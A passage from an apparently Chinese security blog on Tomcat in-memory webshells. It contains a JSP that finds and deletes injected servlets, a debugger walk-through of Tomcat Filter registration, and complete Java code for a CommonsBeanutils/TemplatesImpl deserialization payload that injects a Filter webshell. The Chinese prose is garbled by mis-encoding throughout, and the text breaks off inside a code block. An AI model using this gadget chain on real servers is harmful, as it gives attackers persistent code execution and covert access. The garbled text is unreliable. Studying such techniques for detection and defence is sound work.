class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">deleteServlet</span><span class="params">(HttpServletRequest request, String servletName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;String, Container&gt; childs = getChildren(request);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objChild</span> <span class="operator">=</span> childs.get(servletName);</span><br><span class="line">        <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        HashMap&lt;String, String&gt; servletMaps = getServletMaps(request);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; servletMap : servletMaps.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (servletMap.getValue().equals(servletName)) &#123;</span><br><span class="line">                urlPattern = servletMap.getKey();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (urlPattern != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeServletMapping</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeServletMapping&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">            removeServletMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeServletMapping.invoke(standardContext, urlPattern);</span><br><span class="line">            <span class="comment">// åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeChild</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeChild&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;org.apache.catalina.Container.class&#125;);</span><br><span class="line">            removeChild.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeChild.invoke(standardContext, objChild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    HashMap&lt;String, Container&gt; children = getChildren(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappings = getServletMaps(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappingsCopy = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(servletMappings);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : servletMappingsCopy.entrySet())&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletMapPath</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">        <span class="type">StandardWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (StandardWrapper) children.get(servletName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">servletClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            servletClass = Class.forName(wrapper.getServletClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servlet</span> <span class="operator">=</span> wrapper.getServlet();</span><br><span class="line">            <span class="keyword">if</span> (servlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                servletClass = servlet.getClass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.write(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassName</span> <span class="operator">=</span> servletClass.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassLoaderName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                servletClassLoaderName = servletClass.getClassLoader().getClass().getName();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isMemoryShell(servletClassLoaderName, servletClass))&#123;</span><br><span class="line">                deleteServlet(request, servletName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç å¾ˆå®¹æ˜“ç†è§£ï¼Œç¨å¾®è§£é‡Šä¸€ä¸‹å§ã€‚é¦–å…ˆè·å–childrenå±æ€§å’ŒservletMappingså±æ€§ï¼Œä¹‹åä¸æ–­éå†servletMappingsï¼Œè·å–ClassNameä»¥åŠClassLoaderNameï¼Œä¹‹åè°ƒç”¨isMemoryShellå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºå†…å­˜é©¬ï¼Œå¦‚æœæ˜¯å†…å­˜é©¬åˆ™åˆ é™¤ï¼Œä»¥ä¸‹æ˜¯isMemoryShellå‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­é€»è¾‘å¾ˆç®€å•ç²—æš´ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ClassLoaderä»¥åŠè¯¥Classæ˜¯å¦æœ‰å¯¹åº”çš„ç£ç›˜æ–‡ä»¶ã€‚</p><h3 id="Tomcat-Filter-å‹å†…å­˜é©¬"><a href="#Tomcat-Filter-å‹å†…å­˜é©¬" class="headerlink" title="Tomcat-Filter å‹å†…å­˜é©¬"></a>Tomcat-Filter å‹å†…å­˜é©¬</h3><h4 id="æµç¨‹åˆ†æ-1"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h4><p>å†™ä¸€ä¸ªç®€å•çš„Filterï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;helloFIlter&quot;, urlPatterns = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;rainb0w&quot;</span>);;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŠŠè¯·æ±‚ä¼ å›è¿‡æ»¤é“¾</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ³¨è§£çš„æ–¹å¼æ·»åŠ äº†ä¸€ä¸ªFilterï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸‹è¯¥æ³¨è§£çš„å¤„ç†ä½ç½®ï¼Œé¦–å…ˆåˆ©ç”¨mavenä¸‹è½½æºä»£ç ï¼Œä¹‹åå…¨å±€æœç´¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26dec1ddac507cc052963.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dec1ddac507cc052963.jpg"></a></p><p>è¿›å…¥åï¼Œå‘ç°<code>org.apache.catalina.startup.ContextConfig#processAnnotationWebFilter</code>æ˜¯å¤„ç†@WebFilterçš„å‡½æ•°ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26dfa1ddac507cc054e8a.jpg" title="image-20230803140753347" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dfa1ddac507cc054e8a.jpg" alt="image-20230803140753347"></a></p><p>æ‰“ä¸‹æ–­ç‚¹ï¼Œè·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e051ddac507cc056871.jpg" title="image-20230803141110427" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e051ddac507cc056871.jpg" alt="image-20230803141110427"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒfilterNameçš„å€¼ä¸ºæˆ‘ä»¬åœ¨æ³¨è§£ä¸­é…ç½®å¥½çš„filterNameã€‚æ¥ç€å¾€ä¸‹çœ‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e0f1ddac507cc0583ab.jpg" title="image-20230803141315613" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e0f1ddac507cc0583ab.jpg" alt="image-20230803141315613"></a></p><p>åˆ›å»ºfilterDefå¯¹è±¡ï¼Œè®¾ç½®äº†filterNameå’ŒfilterClassï¼Œå…¶ä¸­filterClassæ˜¯æˆ‘ä»¬åˆ›å»ºçš„FIlterçš„å…¨é™å®šåã€‚ä¹‹åéå†evps</p><p><a href="https://pic.imgdb.cn/item/64d26e191ddac507cc059dbc.jpg" title="image-20230803141701994" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e191ddac507cc059dbc.jpg" alt="image-20230803141701994"></a></p><p>for å¾ªç¯ä¸¤æ¬¡ï¼Œ<code>evp.getNameString()</code>è·å¾—çš„å­—ç¬¦ä¸²ç»“æœæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯filterNameï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯urlPatternsï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨æ³¨è§£ä¸­é…ç½®é‚£ä¸¤ä¸ªå‚æ•°ã€‚å½“nameå˜é‡è¢«èµ‹å€¼urlPatternsæ—¶ï¼Œè¿›å…¥ifè¯­å¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e251ddac507cc05bb2a.jpg" title="image-20230803143642794" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e251ddac507cc05bb2a.jpg" alt="image-20230803143642794"></a></p><p>å¾—åˆ°urlPatternså¹¶éå†ï¼Œå°†æ‰€æœ‰çš„urlPatternæ·»åŠ è¿›filterMapä¸­ã€‚ç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" title="image-20230803143853818" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803143853818"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡è°ƒç”¨<code>addFilter()</code>å’Œ<code>addFilterMapping()</code>å°†<code>filterDef</code>å’Œ<code>filterMap</code>æ·»åŠ è¿›<code>fragment</code>ä¸­ã€‚fragmentæ˜¯ä¸ªwebXmlå¯¹è±¡ï¼Œé‡Œé¢å­˜æ”¾ç€webçš„å„ç§é…ç½®ä¿¡æ¯ï¼Œä¼šå’Œweb.xmlè¯»å–å‡ºæ¥çš„ä¿¡æ¯ä¼šè¿›è¡Œåˆå¹¶ã€‚ç»§ç»­è·Ÿè¿›ï¼Œæ‰§è¡Œåˆ°å¦‚ä¸‹ä»£ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" title="image-20230803144420033" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803144420033"></a></p><p>åˆæ˜¯<code>configureContext</code>å‡½æ•°ï¼Œè¿˜è®°å¾—æˆ‘ä»¬ä¸Šé¢åœ¨åˆ†ææ³¨å†ŒServletæµç¨‹çš„æ—¶å€™ä¹Ÿçœ‹åˆ°äº†è¿™ä¸ªå‡½æ•°å—ï¼Ÿè¿™é‡Œæ³¨é‡Šè§£é‡Šå¾—ä¹Ÿå¾ˆæ¸…æ¥šï¼Œæ­¤å¤„æ˜¯å°†åˆå¹¶åçš„web.xmlåº”ç”¨äºContextã€‚è¿›å…¥configureContextå‡½æ•°ï¼Œæ­¤å¤„è°ƒç”¨addFilterDef()å’ŒaddFilterMap()æ–¹æ³•ï¼ŒcontextåŒæ ·æ˜¯ä¸€ä¸ªStandardContextå¯¹è±¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e461ddac507cc061134.jpg" title="image-20230803144837194" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e461ddac507cc061134.jpg" alt="image-20230803144837194"></a></p><p>ä½†æ˜¯è¯·æ³¨æ„ï¼Œæ­¤æ—¶ä»ç„¶å®Œæˆè‡ªå®šä¹‰ Filter çš„æ³¨å†Œï¼Œå› ä¸ºå¹¶æ²¡æœ‰å°†è¿™ä¸ª Filter æ”¾åˆ° FilterChain ä¸­ã€‚ä¹‹åæˆ‘ä»¬åœ¨doFilterå¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œè®¿é—®&#x2F;hello-servletï¼Œçœ‹åˆ°è°ƒç”¨æ ˆï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e561ddac507cc063bef.jpg" title="image-20230803150533995" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e561ddac507cc063bef.jpg" alt="image-20230803150533995"></a></p><p>å‘ç°åœ¨ä¸‹å›¾çš„ä½ç½®<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>æ‰§è¡Œäº†<code>doFilter</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e621ddac507cc065b55.jpg" title="image-20230803150726766" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e621ddac507cc065b55.jpg" alt="image-20230803150726766"></a></p><p>å¯ä»¥çœ‹åˆ°filteræ˜¯ä»filterConfigå–å‡ºçš„ï¼Œè€ŒfilterConfigæ˜¯ä»filtersæ•°ç»„ä¸­çš„å…ƒç´ èµ‹å€¼å¾—åˆ°çš„ã€‚é‚£ä¹ˆApplicationFilterChainæ˜¯ä»€ä¹ˆæ—¶å€™è¢«åˆ›å»ºçš„å‘¢ï¼Ÿå®ƒå…¶ä¸­çš„filterså­—æ®µåˆæ˜¯ä»€ä¹ˆæ—¶å€™è¢«èµ‹å€¼çš„å‘¢ï¼Ÿç»§ç»­çœ‹è°ƒç”¨æ ˆï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e6c1ddac507cc067732.jpg" title="image-20230803151021951" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e6c1ddac507cc067732.jpg" alt="image-20230803151021951"></a></p><p>å‘ä¸Šå›æº¯ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹å›¾çš„ä½ç½®æ‰§è¡Œäº†filterChain.doFilter()ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºè¿™é‡Œçš„è°ƒç”¨ï¼Œæˆ‘ä»¬åˆ›å»ºçš„Filterä¸­çš„doFilterå¾—ä»¥æ‰§è¡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e791ddac507cc0697ef.jpg" title="image-20230803151109791" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e791ddac507cc0697ef.jpg" alt="image-20230803151109791"></a></p><p>å‘ä¸Šçœ‹ï¼Œå¯ä»¥çœ‹åˆ°filterChainæ˜¯é€šè¿‡ApplicationFilterFactory.createFilterChain()å¾—åˆ°çš„ã€‚è·Ÿè¿›org.apache.catalina.core.ApplicationFilterFactory#createFilterChainï¼Œæ‰“ä¸‹æ–­ç‚¹ï¼Œè¿›è¡Œè°ƒè¯•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e841ddac507cc06b4fd.jpg" title="image-20230803152059321" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e841ddac507cc06b4fd.jpg" alt="image-20230803152059321"></a></p><p><a href="https://pic.imgdb.cn/item/64d26e8f1ddac507cc06d27b.jpg" title="image-20230803152124788" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e8f1ddac507cc06d27b.jpg" alt="image-20230803152124788"></a></p><p>å–å‡ºStandardContextä¸­çš„filterMapså¹¶å¤åˆ¶ç»™filterMapsï¼Œå¯ä»¥çœ‹åˆ°filterMapsä¸­æœ‰æˆ‘ä»¬åˆ›å»ºçš„Filterï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26e9b1ddac507cc06f156.jpg" title="image-20230803152213935" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e9b1ddac507cc06f156.jpg" alt="image-20230803152213935"></a></p><p>ç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/65750a0dc458853aefefc0be.jpg" title="image-20230803152213936" class="gallery-item"><img src="https://pic.imgdb.cn/item/65750a0dc458853aefefc0be.jpg" alt="image-20230803152213936"></a></p><p><a href="https://pic.imgdb.cn/item/64d26eee1ddac507cc07ccd3.jpg" title="image-20230803152442214" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26eee1ddac507cc07ccd3.jpg" alt="image-20230803152442214"></a></p><p>é€šè¿‡.addFilter()æ–¹æ³•æ·»åŠ è¿›ä»StandardContextä¸­å–å‡ºçš„filterConfigï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™filterChainä¸­çš„filtersæ•°ç»„å­—æ®µä¸­çš„å…ƒç´ ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å·²ç»å®Œæ•´åœ°è·Ÿè¿›äº†æ•´ä¸ªFilterçš„æ³¨å†Œå’ŒdoFilterçš„è°ƒç”¨ã€‚</p><p>è¿‡ç¨‹å…¶å®æŒºå¥½ç†è§£ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><p>1.è·å–StandardContextï¼š</p><p>2.åˆ›å»ºFilterDefï¼Œé€šè¿‡addFilterDef()å‡½æ•°æ·»åŠ è¿›StandardContext</p><p>3.åˆ›å»ºApplicationFilterConfigï¼Œé€šè¿‡åå°„æ‹¿åˆ°StandardContextçš„filterConfigså­—æ®µï¼Œå¹¶è°ƒç”¨put()æ–¹æ³•å°†ApplicationFilterConfigæ·»åŠ è¿›StandardContext</p><p>3.åˆ›å»ºFilterMapï¼Œé€šè¿‡addFilterMapBefore()å‡½æ•°æ·»åŠ è¿›StandardContextã€‚</p><h4 id="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Filter-å‹å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥Tomcat-Filter-å‹å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Filter å‹å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥Tomcat-Filter å‹å†…å­˜é©¬</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(FilterTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 